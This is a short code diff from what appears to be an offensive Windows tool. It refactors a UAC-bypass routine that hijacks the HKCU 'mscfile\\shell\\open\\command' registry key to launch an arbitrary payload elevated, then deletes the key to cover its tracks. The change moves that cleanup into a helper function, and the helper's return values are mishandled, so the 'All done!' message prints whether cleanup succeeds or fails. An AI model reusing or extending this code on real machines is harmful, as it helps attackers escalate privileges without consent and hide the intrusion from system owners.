@@ -16,6 +16,14 @@ compmgmtlauncher_info = {
 }
 
 
+def compmgmtlauncher_cleanup(path):
+	print_info("Performing cleaning")
+	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
+		print_success("Successfully cleaned up")
+	else:
+		print_error("Unable to cleanup")
+		return False
+
 def compmgmtlauncher(payload):
 	if payloads().exe(payload):
 		path = "Software\\Classes\\mscfile\\shell\\open\\command"
@@ -35,15 +43,13 @@ def compmgmtlauncher(payload):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				return False
+				if "error" in Constant.output:
+					compmgmtlauncher_cleanup(path)
 
 		time.sleep(5)
 
-		if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
-			print_success("Successfully cleaned up, enjoy!")
-		else:
-			print_error("Unable to cleanup")
-			return False
+		if not compmgmtlauncher_cleanup(path):
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
